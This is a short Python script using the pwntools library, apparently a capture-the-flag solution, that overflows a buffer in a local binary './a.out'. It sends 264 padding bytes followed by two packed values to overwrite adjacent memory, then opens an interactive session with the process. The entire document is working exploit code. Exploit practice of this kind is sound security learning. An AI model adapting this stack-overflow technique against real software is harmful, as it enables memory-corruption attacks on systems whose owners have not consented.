# coding: utf-8
from pwn import *
0x110
payload = b'a'*264+p32(0x1337)+p32(0x69696969)
p=process("./a.out")
p.sendline(payload)
p.interactive()
